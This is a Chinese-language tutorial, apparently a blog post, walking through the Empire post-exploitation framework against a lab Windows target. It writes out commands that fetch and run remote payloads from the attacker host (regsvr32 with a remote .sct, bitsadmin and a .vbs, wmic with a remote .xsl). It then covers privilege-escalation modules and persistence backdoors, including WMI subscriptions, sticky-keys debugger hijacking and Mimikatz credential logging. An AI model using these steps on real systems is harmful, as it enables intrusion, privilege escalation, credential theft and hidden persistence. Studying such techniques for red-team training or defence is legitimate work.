## empire(usestager用法、提权、持久化后门）

本章前提：已成功设置监听器(如何设置监听器请看day14篇)

### 1\. usestager的几种用法

#### windows/launcher_sct:

####  

介绍:Regsv(r)32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。WinXP及以上系统的regsv(r)32.exe在windows\system32文件夹下；2000系统的regsv(r)32.exe在winnt\system32文件夹下。

用法:regsv(r)32 [/u] [/s] [/n] [/i[:cmdline]] dllname

1) usestager windows/launcher_sct 进入windows/launcher_sct模块

![1605692028_5fb4ea7c28511e691cd9d.png!small?1605692029493](https://image.3001.net/images/20201118/1605692028_5fb4ea7c28511e691cd9d.png!small?1605692029493)

2) 设置一下参数

![1605692031_5fb4ea7fc11a15b59f8d5.png!small?1605692033145](https://image.3001.net/images/20201118/1605692031_5fb4ea7fc11a15b59f8d5.png!small?1605692033145)

set Listener kali

set OutFile /var/www/html/xx.sct  
  
---  
  
3) execute 执行

![1605692036_5fb4ea847438a25fa72c7.png!small?1605692037850](https://image.3001.net/images/20201118/1605692036_5fb4ea847438a25fa72c7.png!small?1605692037850)

4) 在靶机上运行 regsv(r)32 /u /n /s /i:http://192.168.227.129/xx.sct scrobj.dll

![1605692040_5fb4ea88ba01215a27789.png!small?1605692042090](https://image.3001.net/images/20201118/1605692040_5fb4ea88ba01215a27789.png!small?1605692042090)![1605692043_5fb4ea8bba26dfab341cd.png!small?1605692045160](https://image.3001.net/images/20201118/1605692043_5fb4ea8bba26dfab341cd.png!small?1605692045160)

5) 成功返回会话

![](https://image.3001.net/images/20201118/1605690791_5fb4e5a726e8ac2165ac5.png!small)

#### windows/launcher_vbs:

远程下载：bitsadmin /transfer /n http://IP/xx.vbs path

1) usestager windows/launcher_vbs 进入windows/launcher_vbs模块

![1605691959_5fb4ea37ee6abb07045d3.png!small?1605691961282](https://image.3001.net/images/20201118/1605691959_5fb4ea37ee6abb07045d3.png!small?1605691961282)

2) 设置一下参数

![1605691967_5fb4ea3fdf095ea3b9c5e.png!small?1605691969315](https://image.3001.net/images/20201118/1605691967_5fb4ea3fdf095ea3b9c5e.png!small?1605691969315)

3) execute 执行

![1605691973_5fb4ea45c342e1fbb3d45.png!small?1605691975156](https://image.3001.net/images/20201118/1605691973_5fb4ea45c342e1fbb3d45.png!small?1605691975156)

4) 在靶机上运行

bitsadmin /transfer n http://192.168.227.129/xx.vbs
C:\Users\xxx\Desktop\xx.vbs

![1605691987_5fb4ea53950fc314e330c.png!small?1605691989046](https://image.3001.net/images/20201118/1605691987_5fb4ea53950fc314e330c.png!small?1605691989046)![1605691991_5fb4ea57381f60b1fc086.png!small?1605691992700](https://image.3001.net/images/20201118/1605691991_5fb4ea57381f60b1fc086.png!small?1605691992700)

5)
靶机执行.vbs文件，成功反弹会话![1605691995_5fb4ea5b7873e54d2dead.png!small?1605691996845](https://image.3001.net/images/20201118/1605691995_5fb4ea5b7873e54d2dead.png!small?1605691996845)

#### windows/launcher_xml:

MSBuild是一个免费的开源构建工具集，用于管理本地C++代码.在Visual
Studio2013之前,MSBuild是作为.NET框架的一部分,但是在其之后,MSBuild被绑定到了Visual Studio.所以,Visual
Studio依赖于MSBuild，但是MSBuild并不依赖于Visual Studio。

用法:利用net4.0之后的版本中的MSBuild运行注入shellcode的xml文件反弹shell。

1) 跟前面两个操作一样生成xml文件到/var/www/html/文件夹下

[![1605691313_5fb4e7b17ee83920e0522.png!small?1605691315113](https://image.3001.net/images/20201118/1605691313_5fb4e7b17ee83920e0522.png!small?1605691315113)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201118164000628-856715279.jpg)

2) 在靶机上下载该文件

![1605691340_5fb4e7cc0bea325d1bc42.png!small?1605691341426](https://image.3001.net/images/20201118/1605691340_5fb4e7cc0bea325d1bc42.png!small?1605691341426)

3) 在靶机上cd到C:\Windows\Microsoft.NET\Framework64\v4.0.30319\使用MSBuild运行xml

![1605691346_5fb4e7d27fe2baadbc73f.png!small?1605691347836](https://image.3001.net/images/20201118/1605691346_5fb4e7d27fe2baadbc73f.png!small?1605691347836)

4) 成功反弹会话

![1605691273_5fb4e7896802ff5f8ae70.png!small](https://image.3001.net/images/20201118/1605691273_5fb4e7896802ff5f8ae70.png!small)

#### windows/wmic:

WMIC扩展WMI（Windows Management Instrumentation，Windows管理工具）
，提供了从命令行接口和批命令脚本执行系统管理的支持。

用法:wmic os get /format:"http://IP/xx.xsl"

1) 跟前面两个的操作步骤一样将生成的xsl存到html文件夹下

![1605691357_5fb4e7dd8e026aa1b4129.png!small](https://image.3001.net/images/20201118/1605691357_5fb4e7dd8e026aa1b4129.png!small)

2) 在靶机上执行wmic os get
/format:"http://192.168.227.129/xx.xsl"![1605691403_5fb4e80b3f1f30292fcf0.png!small?1605691404672](https://image.3001.net/images/20201118/1605691403_5fb4e80b3f1f30292fcf0.png!small?1605691404672)

  

3) 成功反弹会话

![1605691407_5fb4e80f6e19b969fd0bd.png!small?1605691408871](https://image.3001.net/images/20201118/1605691407_5fb4e80f6e19b969fd0bd.png!small?1605691408871)

### 2\. empire提权模块

 **uac和bypassuac在day14有介绍**

 **本地提权**

#### ms16-135：Win32k 信息泄漏漏洞

若要利用此漏洞，攻击者必须登录到受影响的系统并运行经特殊设计的应用程序。此安全更新 程序通过更正 Windows 内核处理内存地址的方式来修复这个漏洞。

searchmodule ms16-135 查找ms16-135模块

![1605691420_5fb4e81cccf3cc97c22f2.png!small?1605691422659](https://image.3001.net/images/20201118/1605691420_5fb4e81cccf3cc97c22f2.png!small?1605691422659)

usemodule privesc/ms16-135 使用模块

![1605691423_5fb4e81fb03250ef7e3a9.png!small?1605691425077](https://image.3001.net/images/20201118/1605691423_5fb4e81fb03250ef7e3a9.png!small?1605691425077)

设置完参数后执行

![1605691426_5fb4e822597ff1acc558a.png!small?1605691427906](https://image.3001.net/images/20201118/1605691426_5fb4e822597ff1acc558a.png!small?1605691427906)

成功反弹拥有特权的会话

![1605691435_5fb4e82b1e15282934d2f.png!small?1605691436513](https://image.3001.net/images/20201118/1605691435_5fb4e82b1e15282934d2f.png!small?1605691436513)

#### ms16-032：辅助登录特权提升漏洞

如果 Windows 辅助登录服务未能正确管理内存中的请求句柄，Microsoft Windows 中会存在 一个特权提升漏洞。
成功利用此漏洞的攻击者能够以管理员身份运行任意代码。

usemodule privesc/ms16-032 使用模块

![1605691482_5fb4e85aaa6245ee91c6b.png!small?1605691484213](https://image.3001.net/images/20201118/1605691482_5fb4e85aaa6245ee91c6b.png!small?1605691484213)

设置完参数执行

![1605691486_5fb4e85ea4ea226f0666a.png!small?1605691488115](https://image.3001.net/images/20201118/1605691486_5fb4e85ea4ea226f0666a.png!small?1605691488115)

成功返回有系统特权的会话

![1605691490_5fb4e86236665724af726.png!small?1605691491626](https://image.3001.net/images/20201118/1605691490_5fb4e86236665724af726.png!small?1605691491626)

![1605691493_5fb4e86555f3a71778527.png!small?1605691494698](https://image.3001.net/images/20201118/1605691493_5fb4e86555f3a71778527.png!small?1605691494698)

powershell/privesc/sherlock 查找Windows本地特权升级漏洞

usemodule privesc/sherlock 使用该模块

![1605691496_5fb4e8686088a1b322063.png!small?1605691497851](https://image.3001.net/images/20201118/1605691496_5fb4e8686088a1b322063.png!small?1605691497851)

显示本地特权升级的漏洞

![1605691500_5fb4e86c0a74a2d0ce70d.png!small?1605691501813](https://image.3001.net/images/20201118/1605691500_5fb4e86c0a74a2d0ce70d.png!small?1605691501813)

#### 利用powerup进行提权

PowerUp是一个PowerShell工具，可协助Windows系统上的本地特权升级。它包含多种方法来
识别和滥用易受攻击的服务，以及DLL劫持机会，易受攻击的注册表设置和升级机会。它是PowerTools
的一部分，位于https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp。Empire
在privesc / powerup / *模块中实现了PowerUp的升级功能 。

usemodule privesc/powerup/allchecks 检测是否可以利用powerup漏洞

![1605691575_5fb4e8b753e704adb3b68.png!small?1605691576757](https://image.3001.net/images/20201118/1605691575_5fb4e8b753e704adb3b68.png!small?1605691576757)

显示存在漏洞

![1605691578_5fb4e8ba48a899cc9f15c.png!small?1605691579659](https://image.3001.net/images/20201118/1605691578_5fb4e8ba48a899cc9f15c.png!small?1605691579659)

根据显示存在的漏洞利用对应模块

![1605691581_5fb4e8bdb54e8a0b38d21.png!small?1605691583154](https://image.3001.net/images/20201118/1605691581_5fb4e8bdb54e8a0b38d21.png!small?1605691583154)

可以看到存在对服务可执行文件的配置不当权限（可通过service_exe_ *加以利用）

不过这边我都试过了一遍，不是很好用

### 3\. 持久化后门

#### PowerBreach

介绍:PowerBreach是一系列内存中的PowerShell后门，可为各种选项提供触发器。

persistence/powerbreach/deaduser–接受用户名和关于用户名是否是域名（相对于本地帐户）的开关/标志。脚本每隔Sleep秒就会检查帐户是否仍然存在，如果不存在则触发登台逻辑。该后门不需要本地管理员权限。

理解:判断你设置的用户名是否存在（有没有被改名或者删除），当被改名的时候会就触发该脚本反弹shell

usemodule persistence/powerbreach/deaduser 使用模块

![1605691586_5fb4e8c218ad2b37ea520.png!small?1605691587507](https://image.3001.net/images/20201118/1605691586_5fb4e8c218ad2b37ea520.png!small?1605691587507)

查看所需参数![1605691590_5fb4e8c620c9788c1eb0b.png!small?1605691591490](https://image.3001.net/images/20201118/1605691590_5fb4e8c620c9788c1eb0b.png!small?1605691591490)

  

设置相关参数

![1605691593_5fb4e8c954ef33676a4ce.png!small?1605691594798](https://image.3001.net/images/20201118/1605691593_5fb4e8c954ef33676a4ce.png!small?1605691594798)

执行

![1605691596_5fb4e8cc3013cdd9c7043.png!small?1605691597581](https://image.3001.net/images/20201118/1605691596_5fb4e8cc3013cdd9c7043.png!small?1605691597581)

把aaa改成了bbb

![1605691599_5fb4e8cf1753872165027.png!small?1605691600408](https://image.3001.net/images/20201118/1605691599_5fb4e8cf1753872165027.png!small?1605691600408)

成功反弹shell

![1605691601_5fb4e8d194e6cf8c2e5db.png!small?1605691602960](https://image.3001.net/images/20201118/1605691601_5fb4e8d194e6cf8c2e5db.png!small?1605691602960)

persistence/powerbreach/eventlog\-事件日志–按时间间隔查询安全事件日志，以查找具有唯一触发器值的事件。此后门DOES需要管理员权限才能访问安全事件日志。

usemodule persistence/powerbreach/eventlog* 使用模块

![1605691605_5fb4e8d56edacd4d3bf18.png!small?1605691606871](https://image.3001.net/images/20201118/1605691605_5fb4e8d56edacd4d3bf18.png!small?1605691606871)

查看所需参数

![1605691607_5fb4e8d7d11e6894d0c4a.png!small?1605691609230](https://image.3001.net/images/20201118/1605691607_5fb4e8d7d11e6894d0c4a.png!small?1605691609230)

设置相关参数

![1605691611_5fb4e8db8c6e4a5810795.png!small?1605691612920](https://image.3001.net/images/20201118/1605691611_5fb4e8db8c6e4a5810795.png!small?1605691612920)

执行

![1605691616_5fb4e8e01610c44143c1d.png!small?1605691617455](https://image.3001.net/images/20201118/1605691616_5fb4e8e01610c44143c1d.png!small?1605691617455)

打开靶机的eventvwr，当安全日志中存在HACKER(上面参数定义的可以自己更改)关键字时

![1605691619_5fb4e8e39c9f07fe47dfb.png!small?1605691621009](https://image.3001.net/images/20201118/1605691619_5fb4e8e39c9f07fe47dfb.png!small?1605691621009)

成功反弹会话![1605691627_5fb4e8eb9607c31aa22c8.png!small?1605691628948](https://image.3001.net/images/20201118/1605691627_5fb4e8eb9607c31aa22c8.png!small?1605691628948)

  

由于是管理员权限留下的后门，所以返回的会话也拥有管理员权限

![1605691630_5fb4e8eee73f162c73dbb.png!small?1605691632268](https://image.3001.net/images/20201118/1605691630_5fb4e8eee73f162c73dbb.png!small?1605691632268)

persistence/powerbreach
/resolver–需要解析的主机名和触发IP。脚本每隔睡眠秒数检查一次主机名是否解析为触发IP，否则将触发暂存逻辑。该后门不需要本地管理员权限。

usemodule persistence/powerbreach/resolver 使用模块

![1605691636_5fb4e8f43bf376f87a23d.png!small?1605691637943](https://image.3001.net/images/20201118/1605691636_5fb4e8f43bf376f87a23d.png!small?1605691637943)

查看所需参数

![1605691638_5fb4e8f65704a026056f9.png!small?1605691639665](https://image.3001.net/images/20201118/1605691638_5fb4e8f65704a026056f9.png!small?1605691639665)

设置相关参数

![1605691641_5fb4e8f95ca403e2dfe63.png!small?1605691642721](https://image.3001.net/images/20201118/1605691641_5fb4e8f95ca403e2dfe63.png!small?1605691642721)

执行

![1605691644_5fb4e8fc5b3b7c3365167.png!small?1605691645743](https://image.3001.net/images/20201118/1605691644_5fb4e8fc5b3b7c3365167.png!small?1605691645743)

靶机上去访问一下127.0.0.1，让他进行解析

![1605691647_5fb4e8ff46d6dba6b5b7a.png!small?1605691648737](https://image.3001.net/images/20201118/1605691647_5fb4e8ff46d6dba6b5b7a.png!small?1605691648737)

成功反弹shell

![1605691650_5fb4e902d44472cd13d7b.png!small?1605691652326](https://image.3001.net/images/20201118/1605691650_5fb4e902d44472cd13d7b.png!small?1605691652326)

#### Userland

persistence/userland/
*模块允许用户态，从重启的持久性（即无需管理权限）。如果指定了侦听器，则会自动生成Empire代理的登台代码并将其用作触发的脚本逻辑。

persistence/userland /registry
–在HKCU:Software\Microsoft\Windows\CurrentVersion\Run中设置一个值，以在选择的任何存储机制下执行脚本。仅当该用户登录时，这将导致脚本运行。

usemodule persistence/userland/registry 使用模块

![1605691655_5fb4e9076ff42d549a1ef.png!small?1605691656754](https://image.3001.net/images/20201118/1605691655_5fb4e9076ff42d549a1ef.png!small?1605691656754)

查看所需参数

![1605691658_5fb4e90a41609bcbf962d.png!small?1605691659627](https://image.3001.net/images/20201118/1605691658_5fb4e90a41609bcbf962d.png!small?1605691659627)

设置相关参数

![1605691661_5fb4e90da21bbb6338320.png!small?1605691663067](https://image.3001.net/images/20201118/1605691661_5fb4e90da21bbb6338320.png!small?1605691663067)

执行

![1605691664_5fb4e910be90b8c6d6948.png!small?1605691666200](https://image.3001.net/images/20201118/1605691664_5fb4e910be90b8c6d6948.png!small?1605691666200)

将靶机注销重新登录，成功返回shell会话（这里用户登录的时候会有短暂的powershell弹框）

![1605691667_5fb4e9139560e091f6546.png!small?1605691668909](https://image.3001.net/images/20201118/1605691667_5fb4e9139560e091f6546.png!small?1605691668909)

persistence/userland/schtask–配置计划的任务以在选择任何存储机制的情况下执行脚本。该脚本可以在DailyTime（HH：mm格式）下触发，或者在用户闲置IdleTime秒后触发

理解:这个是放注册表中的计划任务

usemodule persistence/userland/schtasks 使用模块

![1605691671_5fb4e91705bb18ade6990.png!small?1605691672396](https://image.3001.net/images/20201118/1605691671_5fb4e91705bb18ade6990.png!small?1605691672396)

查看所需参数

![1605691673_5fb4e919d4c4a5fc5ff6a.png!small?1605691675521](https://image.3001.net/images/20201118/1605691673_5fb4e919d4c4a5fc5ff6a.png!small?1605691675521)

设置相关参数

![1605691677_5fb4e91d81555c38e33c7.png!small?1605691679041](https://image.3001.net/images/20201118/1605691677_5fb4e91d81555c38e33c7.png!small?1605691679041)

执行![1605691680_5fb4e9201809c65a3783c.png!small?1605691681473](https://image.3001.net/images/20201118/1605691680_5fb4e9201809c65a3783c.png!small?1605691681473)

  

将靶机注销重新登录，等设置的时间到，成功返回shell会话

![1605691683_5fb4e9232c5f39f91a44e.png!small?1605691684551](https://image.3001.net/images/20201118/1605691683_5fb4e9232c5f39f91a44e.png!small?1605691684551)

#### Elevated

persistence/elevated/*模块允许重启的持久性从升高的上下文（即具有管理特权）。如果指定了侦听器，则会自动生成Empire代理的登台代码并将其用作触发的脚本逻辑。

理解:该模块是拥有管理员权限留下的拥有权限的后门

persistence/elevated/registry、persistence/elevated/schtask，这两个用法和之前的一样，只不过需要管理员权限

persistence/elevated/wmi–配置永久WMI订阅以激发存储的脚本逻辑。该脚本可以在DailyTime（HH：mm格式）或使用AtStartup启动系统时触发。这具有难以检测/去除的等级。

理解:这个是放注册表中的计划任务

usemodule persistence/elevated/wmi* 使用模块

![1605691693_5fb4e92dd98823bf9b00d.png!small?1605691695339](https://image.3001.net/images/20201118/1605691693_5fb4e92dd98823bf9b00d.png!small?1605691695339)

查看所需参数

![1605691696_5fb4e930508ed3db2a1be.png!small?1605691698126](https://image.3001.net/images/20201118/1605691696_5fb4e930508ed3db2a1be.png!small?1605691698126)

设置相关参数

![1605691700_5fb4e9342149c59b77a64.png!small?1605691701609](https://image.3001.net/images/20201118/1605691700_5fb4e9342149c59b77a64.png!small?1605691701609)

执行

![1605691704_5fb4e93846fc45114391f.png!small?1605691705697](https://image.3001.net/images/20201118/1605691704_5fb4e93846fc45114391f.png!small?1605691705697)

将靶机上验证wmi，在powershell中直接输入Get-WMIObject -Namespace root\Subscription -Class
CommandLineEventConsumer -Filter “Name=’Updater’”

![1605691707_5fb4e93b87ebd8c6fc808.png!small?1605691708908](https://image.3001.net/images/20201118/1605691707_5fb4e93b87ebd8c6fc808.png!small?1605691708908)

重启靶机，成功反弹有管理员权限的shell

![1605691710_5fb4e93e9ca3537901c95.png!small?1605691711936](https://image.3001.net/images/20201118/1605691710_5fb4e93e9ca3537901c95.png!small?1605691711936)

![1605691713_5fb4e9419c1a00be496f6.png!small?1605691715153](https://image.3001.net/images/20201118/1605691713_5fb4e9419c1a00be496f6.png!small?1605691715153)

#### misc

persistence/misc/debugger*-在empire3.6.0版本中把persistence / debugger / *
模块整合到了persistence/misc/debugger*模块中。您可以为RDP提示符下登录前可访问的各种可执行文件设置“映像文件执行选项”（又名调试器）。默认情况下，调试器设置为cmd.exe，它使您可以触发通过RDP以SYSTEM身份运行的命令提示符，而无需实际登录计算机。您还可以使用Binary参数指定另一个二进制文件的路径。如果要调试器触发暂存器，请设置Listener参数。这将为指定的侦听器生成一个合适的暂存器，并将其存储到指定的RegPath中。然后，您可以从RDP提示预身份验证中触发这些登台程序，但是请注意，一旦关闭RDP提示（在不活动30秒后发生），登台的代理将被杀死。

usemodule persistence/misc/debugger* 使用模块

![1605691717_5fb4e9457953f9512408c.png!small?1605691719004](https://image.3001.net/images/20201118/1605691717_5fb4e9457953f9512408c.png!small?1605691719004)

查看所需参数

![1605691719_5fb4e9476d552971cde30.png!small?1605691720811](https://image.3001.net/images/20201118/1605691719_5fb4e9476d552971cde30.png!small?1605691720811)

设置参数

![1605691722_5fb4e94a7e6b3f18dca0e.png!small?1605691723884](https://image.3001.net/images/20201118/1605691722_5fb4e94a7e6b3f18dca0e.png!small?1605691723884)

执行

![1605691725_5fb4e94d33c6289c13f12.png!small?1605691726589](https://image.3001.net/images/20201118/1605691725_5fb4e94d33c6289c13f12.png!small?1605691726589)

在靶机win7登录界面按5次shift，有个powershell的框一闪而过

![1605691728_5fb4e950779789cc5deee.png!small?1605691729849](https://image.3001.net/images/20201118/1605691728_5fb4e950779789cc5deee.png!small?1605691729849)

成功返回会话，并且是管理员权限

![1605691732_5fb4e9543b02461e94487.png!small?1605691733565](https://image.3001.net/images/20201118/1605691732_5fb4e9543b02461e94487.png!small?1605691733565)

persistence/misc/memssp–安装Mimikatz的memssp模块，该模块应将所有身份验证事件注销到C：\ Windows \
System32 \ mimisla.log。应该重新引导持久。

usemodule persistence/misc/memssp* 使用模块

![1605691736_5fb4e9588bb2abee8ac31.png!small?1605691737861](https://image.3001.net/images/20201118/1605691736_5fb4e9588bb2abee8ac31.png!small?1605691737861)

直接运行就可以了

![1605691739_5fb4e95bb749d2f875315.png!small?1605691741190](https://image.3001.net/images/20201118/1605691739_5fb4e95bb749d2f875315.png!small?1605691741190)

靶机对应目录生成了mimisla.log文件

![1605691743_5fb4e95fc4cff5f429ca3.png!small?1605691745160](https://image.3001.net/images/20201118/1605691743_5fb4e95fc4cff5f429ca3.png!small?1605691745160)

persistence/misc/disable_machine_acct_change–禁止目标更改其计算机帐户密码。如果首先运行mimikatz/credentials/logonpasswords来转储计算机帐户密码（帐户以$结尾），则您应该具有对给定系统的持久访问权限。清理选项也可用。

使用该模块后直接运行就可以了

![1605691746_5fb4e9629711d5854a7ae.png!small?1605691748058](https://image.3001.net/images/20201118/1605691746_5fb4e9629711d5854a7ae.png!small?1605691748058)

  

